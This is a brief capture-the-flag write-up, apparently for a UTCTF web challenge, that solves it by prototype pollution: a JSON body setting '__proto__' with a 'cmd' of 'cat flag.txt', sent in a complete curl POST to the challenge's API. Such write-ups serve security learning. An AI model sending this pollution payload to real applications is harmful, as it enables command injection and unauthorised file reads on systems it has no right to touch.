+ prototype pollution 
+ So we can exploit this attack and send a POST request with this body:
```
{
  "attributes": ["__proto__"],
  "values": [{ "cmd": "cat flag.txt" }]
}
```
post request:
```
curl 'http://guppy.utctf.live:8725/api/absorbCompany/0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-GB,en;q=0.9,sk-SK;q=0.8,sk;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: connect.sid=YOURSID' \
  -H 'Origin: http://guppy.utctf.live:8725' \
  -H 'Referer: http://guppy.utctf.live:8725/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \
  --data-raw '{"attributes":["__proto__"],"values":[{"cmd": "cat flag.txt"}]}' \
  --insecure
  ```
  And we get the flag
  